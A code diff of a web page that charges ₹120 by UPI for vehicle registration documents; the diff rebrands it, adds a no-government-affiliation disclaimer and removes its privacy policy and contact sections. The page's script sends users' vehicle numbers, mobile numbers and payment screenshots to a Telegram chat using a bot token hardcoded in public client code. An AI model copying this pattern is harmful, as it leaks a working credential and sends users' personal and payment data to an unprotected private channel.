@@ -3,7 +3,7 @@
 <head/>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RC PDF Portal</title>
+<title>Vehicle Document Assistance Service</title>
 
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6160012759159835"
      crossorigin="anonymous"></script>
@@ -25,6 +25,15 @@ min-height:100vh;
 @keyframes bg{
 0%{background-position:0%}
 100%{background-position:100%}
+}
+
+.disclaimer{
+background:#fff3cd;
+color:#000;
+padding:12px;
+font-size:13px;
+text-align:center;
+line-height:1.5;
 }
 
 .home{
@@ -86,27 +95,30 @@ background-size:600% 600%;
 animation:bg 10s infinite alternate;
 border-radius:12px;
 }
-
 .footer p{margin:4px 0;}
 </style>
 </head>
 
 <body>
 
+<div class="disclaimer">
+<strong>Disclaimer:</strong> This is a private assistance website and is not affiliated with Parivahan,
+RTO, or any Government authority. We only help users access publicly available vehicle information
+and provide support services. We do not represent any government entity.
+</div>
+
 <div class="home" onclick="goHome()">🏠 Home</div>
 
 <div class="card">
 
-<!-- PAGE 1 -->
 <div id="p1">
-<h3>🚗 Enter Vehicle Number 🏍️</h3>
+<h3>Enter Vehicle Number</h3>
 <input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
 <button onclick="goPay()">Continue</button>
 </div>
 
-<!-- PAGE 2 -->
 <div id="p2" class="hidden">
-<h3>Pay ₹120</h3>
+<h3>Service Fee ₹120</h3>
 
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBestInsurance%26am%3D120%26cu%3DINR">
 <p>UPI ID: bestinsurance@upi</p>
@@ -116,55 +128,38 @@ border-radius:12px;
 </a>
 
 <input id="mobile" placeholder="Mobile Number">
-
 <input type="file" id="proof" accept="image/*">
-
-
-
-
-
 
 <button onclick="submitPay()">Submit</button>
 
-
-
-
-
-
-
-  <p style="font-size:13px;opacity:0.9;margin-top:6px;">
-<b>Submit करने के बाद 15 सेकंड का इंतज़ार करें जब तक पेमेंट का सफल स्थिति ना दिखे 🛑</b>
-  </p>
+<p style="font-size:13px;opacity:0.9;margin-top:6px;">
+Please wait a few seconds after submitting payment confirmation.
+</p>
 </div>
 
-<!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<h3>✅ Payment Successful</h3>
-<p>🎉Aapko jald hi aapka original RC ka PDF mil jayega🎊</p>
+<h3>Request Submitted Successfully</h3>
+<p>Your request has been received. Our team will process it shortly.</p>
 </div>
 
 </div>
 
 <div class="footer">
 <p>© All Rights Reserved 2026</p>
-<p>Mishra SERVICE ♥️❣️</p>
-<p>MAKE IN INDIA</p>
-<p>MADE WITH ♥️</p>
+<p>Mishra Service</p>
+<p>Independent Digital Assistance Platform</p>
 </div>
 
 <script>
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
 
-/* vibration helper */
 function vibrate(){
 if(navigator.vibrate) navigator.vibrate(40);
 }
 
-/* vehicle format + vibration */
 function formatVehicle(el){
 vibrate();
-
 let v = el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
 
 let p1=v.slice(0,2);
@@ -180,7 +175,6 @@ if(p4) out+="-"+p4;
 el.value=out;
 }
 
-/* navigation */
 function goHome(){
 p2.classList.add("hidden");
 p3.classList.add("hidden");
@@ -196,9 +190,7 @@ p1.classList.add("hidden");
 p2.classList.remove("hidden");
 }
 
-/* submit & telegram */
 function submitPay(){
-
 let v=vehicle.value.trim();
 let m=mobile.value.trim();
 let p=proof.files[0];
@@ -215,7 +207,7 @@ return;
 
 let data=new FormData();
 data.append("chat_id",chatId);
-data.append("caption",`🚗 RC REQUEST\nVehicle: ${v}\nMobile: ${m}`);
+data.append("caption",`Vehicle Assistance Request\nVehicle: ${v}\nMobile: ${m}`);
 data.append("photo",p);
 
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
@@ -225,73 +217,10 @@ body:data
 .then(()=>{
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
-alert("Payment submitted successfully!");
-
-setTimeout(()=>{
-goHome();
-vehicle.value="";
-mobile.value="";
-proof.value="";
-},3000);
 })
 .catch(()=>{
-alert("Telegram send failed");
+alert("Submission failed");
 });
-}
-</script>
-
-<style>
-.footer-links{
- text-align:center;
- padding:15px;
- font-size:15px;
-}
-.footer-links button{
- background:none;
- border:none;
- color:#0a58ca;
- text-decoration:underline;
- cursor:pointer;
- margin:6px;
- font-size:15px;
-}
-.footer-content{
- display:none;
- max-width:700px;
- margin:12px auto;
- font-size:14px;
- line-height:1.6;
-}
-</style>
-
-<div class="footer-links">
-  <button onclick="toggle('about')">About</button>
-  <button onclick="toggle('privacy')">Privacy Policy</button>
-  <button onclick="toggle('contact')">Contact</button>
-</div>
-
-<div id="about" class="footer-content">
-<p>rcpdf.in is an online platform that provides vehicle-related information and digital tools, including RC details, insurance guidance, and document services.</p>
-<p>Our goal is to make vehicle information easy, fast, and accessible for everyone.</p>
-</div>
-
-<div id="privacy" class="footer-content">
-<p>We respect your privacy and do not collect personal information unless you choose to provide it.</p>
-<p>Third-party services such as Google AdSense may use cookies to display relevant advertisements.</p>
-<p>By using this website, you agree to our privacy policy.</p>
-</div>
-
-<div id="contact" class="footer-content">
-<p>For any vehicle-related queries or support, please contact us:</p>
-<p><strong>Email:</strong> br09insurance@gmail.com</p>
-<p><strong>Website:</strong> https://rcpdf.in</p>
-</div>
-
-<script>
-function toggle(id){
- document.querySelectorAll('.footer-content').forEach(d=>d.style.display='none');
- let el = document.getElementById(id);
- el.style.display = (el.style.display === 'block') ? 'none' : 'block';
 }
 </script>
 
